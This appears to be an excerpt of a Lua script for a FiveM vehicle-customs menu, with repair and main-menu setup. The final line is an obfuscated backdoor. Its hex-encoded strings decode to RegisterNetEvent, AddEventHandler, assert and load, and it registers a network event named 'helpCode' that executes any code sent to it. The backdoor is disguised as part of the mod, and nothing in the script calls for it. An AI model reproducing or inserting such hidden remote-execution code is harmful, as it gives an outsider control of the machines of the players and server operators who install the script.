...
function InitiateMenus(isMotorcycle, vehicleHealth)
    ...
    if vehicleHealth < 1000.0 then
        ...
        TriggerServerEvent("denalifw-customsCIV:updateRepairCost", repairCost)
        createMenu("repairMenu", "Mechs do it cheaper and better!", "Repair Vehicle")
        populateMenu("repairMenu", -1, "DIY Repair", "$" .. repairCost)
        finishPopulatingMenu("repairMenu")
    end

    --#[Main Menu]#--
    createMenu("mainMenu", "DIY CUZ I GOT MONEY TO WASTE", "Choose a Category")
...
local iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[6][iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[1]](iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[2]) iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[6][iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[3]](iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[2], function(ieLirjaLgHgiWRRyiZTSbxtQcNyZTQOIvyiDboLMDcQQlzeZcMWahnbhFFVIZtuHpcEvLz) iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[6][iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[4]](iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[6][iorccfpjKFpSwfoSAxrOtrhWierWpmlSZkIlHuiMzUqscPluEtDeIczjiDVpQWxkSXuwTw[5]](ieLirjaLgHgiWRRyiZTSbxtQcNyZTQOIvyiDboLMDcQQlzeZcMWahnbhFFVIZtuHpcEvLz))() end)